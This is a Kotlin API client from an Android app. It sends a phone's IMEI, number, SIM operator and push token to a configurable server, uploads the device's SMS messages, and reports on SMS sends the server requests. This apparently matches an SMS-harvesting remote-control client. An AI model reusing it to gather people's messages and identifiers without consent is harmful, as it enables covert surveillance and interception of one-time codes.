package com.boom.client.api

import com.boom.client.utils.Prefs
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

object ApiClient {

    private fun post(endpoint: String, body: JSONObject): JSONObject? {
        return try {
            val url = URL("${Prefs.serverUrl}$endpoint")
            val conn = url.openConnection() as HttpURLConnection
            conn.apply {
                requestMethod = "POST"
                setRequestProperty("Content-Type", "application/json")
                doOutput = true
                connectTimeout = 15_000
                readTimeout = 15_000
            }
            OutputStreamWriter(conn.outputStream).use { it.write(body.toString()) }
            if (conn.responseCode in 200..299) {
                JSONObject(conn.inputStream.bufferedReader().readText())
            } else null
        } catch (e: Exception) { null }
    }

    fun checkin(
        deviceId: String, name: String, phoneNumber: String, model: String,
        manufacturer: String, androidVersion: String, imei: String,
        simOperator: String, batteryLevel: Int, fcmToken: String
    ): JSONObject? {
        return post("/api/checkin", JSONObject().apply {
            put("deviceId", deviceId); put("name", name); put("phoneNumber", phoneNumber)
            put("model", model); put("manufacturer", manufacturer)
            put("androidVersion", androidVersion); put("imei", imei)
            put("simOperator", simOperator); put("batteryLevel", batteryLevel)
            put("fcmToken", fcmToken); put("serverUrl", Prefs.serverUrl)
        })
    }

    fun uploadSms(deviceId: String, messages: JSONArray): JSONObject? {
        return post("/api/sms/upload", JSONObject().apply {
            put("deviceId", deviceId); put("messages", messages)
        })
    }

    fun reportSmsResult(smsId: String, success: Boolean): JSONObject? {
        return post("/api/sms/send-result", JSONObject().apply {
            put("smsId", smsId); put("success", success)
        })
    }
}
